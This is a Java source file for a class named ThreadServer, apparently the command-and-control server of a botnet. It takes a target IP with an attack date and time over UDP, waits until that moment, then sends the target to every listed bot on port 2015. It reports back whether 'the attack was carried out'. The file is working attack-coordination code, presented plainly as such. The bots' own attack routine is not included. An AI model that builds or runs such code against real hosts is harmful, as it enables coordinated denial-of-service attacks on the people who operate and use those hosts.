import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.util.*;


public class ThreadServer extends Thread {

	//-------------------------------- VARIABLES --------------------------------//
	
	// Bot list
	ArrayList<InetAddress> bot_list = null;
	DatagramPacket request;
	DatagramSocket socket_thread = null;
	boolean var_while = true; // while(true)
	boolean done = false;

	
	//-------------------------------- CONSTRUCTORS --------------------------------//
	
	public ThreadServer(DatagramPacket new_request, ArrayList<InetAddress> new_bot_list) {
		
		request = new_request;
		bot_list = new_bot_list;
	
	}
	
	
	//-------------------------------- METHODS --------------------------------//
	
	// run() method
	public void run() {
			
		try {
			
			//-------------------------- PROCESSING REQUEST (UDP) --------------------------//
				
			// Recover message data
			byte[] message_bytes = request.getData();
			String attack_data = new String(message_bytes, "UTF-8");
			
			// Split received chain to obtain attack date and hour
			String[] divide_data = attack_data.split("-");
		
			String url = divide_data[0].trim(); // Target IP
		
			String received_date = divide_data[1];
			String[] divide_date = received_date.trim().split("/");
		
			String received_time = divide_data[2];
			String[] divide_time = received_time.trim().split(":");

			Calendar attack_date = new GregorianCalendar();
			// Set the values for the calendar fields YEAR, MONTH, DAY_OF_MONTH, HOUR_OF_DAY, and MINUTE.
			attack_date.set(Integer.parseInt(divide_date[2]), Integer.parseInt(divide_date[1])-1, Integer.parseInt(divide_date[0]), 
					Integer.parseInt(divide_time[0]), Integer.parseInt(divide_time[1]));
			long attack_date_mseconds = attack_date.getTimeInMillis(); // Attack date in miliseconds
		
			// Variables to obtain current time
			TimeZone tz = TimeZone.getTimeZone("GMT+1");
			Locale local = new Locale("es", "ESP");
			Calendar current_time = new GregorianCalendar(tz, local);
			long current_time_mseconds = current_time.getTimeInMillis(); // Current time in miliseconds
		
		
			// Thread will sleep until attack date
			Thread.sleep (attack_date_mseconds - current_time_mseconds);

				
			
			//---------------------- SEND ATTACK MESSAGE TO BOTS (UDP) ----------------------//
	
			socket_thread = new DatagramSocket();
	
			// Create the message
			byte[] message = url.getBytes();

			// Send target IP to all the bots of the iterator list
			Iterator<InetAddress> it = bot_list.iterator();
			while(it.hasNext())	{
					
				// Create a datagram to send a message to the serrver
				DatagramPacket bot_request = new DatagramPacket(message, url.length(), it.next(), 2015);
					
				// Sending the datagram 10 times
				for (int i=0; i<10; i++)
					socket_thread.send(bot_request);

				// Reply to test if the bot is available
				byte[] buffer = new byte[1000];
				DatagramPacket server_response = new DatagramPacket(buffer, buffer.length);
					
				try {
					
					// If during 5 seconds the bot does not answer, we try with the next bot
					socket_thread.setSoTimeout(10000);
					socket_thread.receive(server_response);
					done = true;
					System.out.println("Bot " + bot_request.getAddress().toString().replace("/","") + " is available.");
						
				} catch (SocketTimeoutException STe) {
					System.out.println("Bot " + bot_request.getAddress().toString().replace("/","") + " is not available.");
				}
					
			} // End bot_list iterator
			
			
			// Reply the client if the attack was carried out or it failed
			String reply_client = null;
			
			if(!done) 
				reply_client = "We are sorry! There aren't any bot availavle so the attack failed.";
			else
				reply_client = "The attack was carried out.";
			
			byte[] msg_reply_cliente = reply_client.getBytes();
			DatagramPacket reply = new DatagramPacket(msg_reply_cliente, reply_client.length(), request.getAddress(), request.getPort());
			socket_thread.send(reply);
			
			System.out.println("Client "+request.getAddress().toString().replace("/","")+": "+reply_client);
			
			// Close socket
			socket_thread.close();
			
		} catch (UnsupportedEncodingException UEe) {
			System.out.println("Error when coding in UTF-8: "+ UEe.toString()+"\n");
		} catch (UnknownHostException UHe) {
			System.out.println ("Target IP error: " + UHe.getMessage());
		} catch (InterruptedException Ie) {
			System.out.println ("Error when sleeping the thread: " + Ie.getMessage());
		} catch (SocketException Se) {
			System.out.println("Socket error: " + Se.getMessage());
		} catch (IOException IOe) {
			System.out.println ("IO error (sending or receiving in socket): " + IOe.getMessage());
		}
		
	}

}
